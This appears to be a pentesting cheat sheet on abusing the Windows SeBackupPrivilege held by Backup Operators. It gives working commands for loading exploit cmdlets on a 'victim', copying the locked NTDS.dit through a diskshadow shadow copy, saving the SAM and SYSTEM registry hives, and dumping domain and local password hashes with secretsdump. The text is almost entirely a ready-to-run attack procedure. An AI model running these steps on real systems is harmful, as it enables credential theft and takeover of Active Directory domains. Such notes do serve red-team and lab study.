This is a built-in group membership and grants its members the **SeBackup** and **SeRestore** privileges.
**SeBackupPrivilege** allows us to traverse any folder and list the folder contents, without getting into any ACLs.

## How to exploit
https://github.com/k4sth4/SeBackupPrivilege
1)Transfer the exploit to the victim
2)Import all the libraries
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
3)Enable the priviledge: `Set-SeBackupPrivilege`
4)Check Result: 
```
Get-SeBackupPrivilege
SeBackupPrivilege is enabled
```
5)Copy file, if file is protected then use this: 
```
Copy-FileSeBackupPrivilege 'PATH/TO/PROTECTED/FILE' 'PATH/WHERE/TO/SAVE'
```


## How to extract NTDS.dit from AD Joined machine 
(aka SAM for AD)
The file NTDS.dit holds all the Password hashes for AD joined machines but it's always locked so it can't be just copy/pasted.
To circumnavigate the problem you have to create a shadow-copy.
1)Create a new Shadow copy if C: and map it to E:
```
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
2)Check the new disk is list-able
```
dir E:/
```
3)Now we can backup the **NTDS.dit** from E:(Not used by system)
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit 'C:\Temp\ntds.dit'
```
4)Transfer to yourself for decrypt
5)Decrypt with secretsdump: 
```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## How to exctract SAM/SYSTEM HIVES
If you have **SeBackupPrivilege** you can also backup SAM/SYSTEM/SECURITY HIVES registries and parse them locally to extract password hashes from dumps.

1)Check that Permission in enabled: `whoami /priv` 
```
Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
```
2)Enable the priviledge: 
```
Set-SeBackupPrivilege
```
3)Check again that priviledge is enabled
4)backup HIVES
```
reg save HKLM\SYSTEM C:\Temp\SYSTEM.BAK
reg save HKLM\SAM C:\Temp\SAM.BAK
```
5)Transfer **bak** files locally to your machine
5)Dump with secretsdump: 
```
secretsdump.py -system SYSTEM.BAK -sam SAM.BAK -hashes lmhash:nthash LOCAL
```